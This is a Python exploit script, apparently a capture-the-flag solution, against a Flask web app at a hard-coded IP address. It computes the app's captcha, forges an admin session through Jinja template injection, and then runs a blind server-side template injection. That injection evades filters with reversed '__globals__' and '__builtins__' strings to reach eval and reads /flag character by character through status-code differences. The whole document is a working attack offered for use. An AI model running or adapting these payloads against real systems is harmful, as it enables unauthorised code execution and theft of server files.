import string
import requests

sess = requests.Session()
URL = 'http://34.124.157.127:5000'
FLAG = ''

def gen_captcha():
	p = []
	head = b'hello '
	c = '203c0617e3bde7ec99b5b657417a75131e3629b8ffdfdbbbbfd02332'
	c = bytes.fromhex(c)

	a = c[0] ^ head[0]
	b = (c[1]^head[1]) - a


	for i in c:
		p.append(i)

	captcha = ''
	for i in p:
		captcha += chr(a^i)
		a = (a+b)%256
	return captcha[6:]

def login(secret):
	data = {'username':'a','password':'a','secret':secret, 'captcha':gen_captcha()}
	r = sess.post(URL+'/login',data=data)
	# print(r.text)

def set_admin():
	data = {'picture':"""{%set x=session.update({'username':'admin','check':1})%}"""}
	r = sess.post(URL+'/rate',data=data)
	# print(r.text)

def blind_flag():
	global FLAG
	for i in range(0,150):
		login('a'*i)
		set_admin()
		for char in string.ascii_letters + '{_!}':
			print(char,end="\r")
			data = {'picture':"""{% set l=session['sr']|length%}{% set g='__slabolg__'|reverse%}{% set b='__snitliub__'|reverse%}{% set p=t.__init__[g][b]['eval']%}{<{p('m if [c for c in open("/flag")][l-l][l]=="char" else l',{"l":l})}>}""".replace('char',char)}
			# print(data)
			r = sess.post(URL+'/rate',data=data)
			# print(r.text)
			# print(r.status_code)
			if r.status_code != 200:
				FLAG += char
				print(FLAG)
				sess.cookies.clear()
				break

if __name__ == '__main__':
	blind_flag()
